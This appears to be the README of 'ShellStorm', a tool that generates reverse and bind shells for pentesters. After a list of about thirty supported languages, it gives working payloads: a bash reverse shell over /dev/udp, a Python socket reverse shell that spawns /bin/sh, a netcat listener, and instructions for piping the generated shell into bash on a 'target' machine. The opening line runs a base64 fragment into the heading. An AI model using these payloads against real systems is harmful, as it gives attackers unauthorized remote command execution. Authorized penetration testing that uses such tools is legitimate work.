GhhbmtzIHRvIGFsbCBwZW9wbGUgd2hvIGNvbnRyaWJ1dGVzIGFuZCBtYWtlcyB0ZWNobm9sb2d5IHBvc3NpYmxlLiBTcGVjaWFsIHRoYW5rcyB0byBUb2t5b25lb24gLCBQLkMuLCBTaGVsbGRyZWRkLCBTNHZpdGFyLCBXaWxkWmFyZWssIFdlYXBvblNob3RndW4u# ShellStorm
Automatic reverse/bind shell generator cheat sheet.  

A compilation of knowledge over the years from many pentesters that you will recognize  
after reading the source code to make the process of creating reverse and bind connections easier  
for cybersecurity analysts.  

* Install requirements for generate **WAR** package.  
<pre>sudo apt-get update -y && sudo apt-get install default-jdk -y</pre>

## Available languages/programs  
<pre>
asp
awk
bash
c
cpan
dart
gawk
golang
groovy
java
jsp
lua
nc
nc-nef (netcat without -e flag, mkfifo)
nodejs
openssl
perl
php
php-daemon
php-simple
ps1
ps1-ds (powershell download string)
python
ruby
sbd
socat
telnet
war
</pre>

# Screenshots
![alt text](https://github.com/0bfxGH0ST/ShellStorm/blob/main/screenshots/screenshot01.png)  
![alt text](https://github.com/0bfxGH0ST/ShellStorm/blob/main/screenshots/screenshot2.png)  

# TL;DR

## Try go further
* In some cases you can download shellstorm in any 'target' machine with Linux kernel (or WSL) and execute it by piping it if you prefer.  
<pre>
bash shellstorm.sh bash 10.2.54.13 1337 | bash
</pre>

* Do you want UDP shell? No problem, 'sed' it.
<pre>
bash shellstorm.sh bash 127.0.0.1 1337 | sed -e 's/tcp/udp/g'
Output:
bash -c "bash -i >& /dev/udp/127.0.0.1/1337 0>&1"
</pre>

* You can pipe it too.
<pre>
bash shellstorm.sh bash 127.0.0.1 1337 | sed -e 's/tcp/udp/g' | bash
Note:  
Remember use -u (udp) flag in netcat listener as following:  
nc -u -lvp 1337
</pre>

## Brains
In some cases you will find some payload that contains a **system call** as the following **'/bin/sh'** (for Linux) you can modify  
it by changing **'/bin/sh'** for **'cmd.exe'** and then you got a python payload for Windows in this case.  
<pre>
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
</pre>
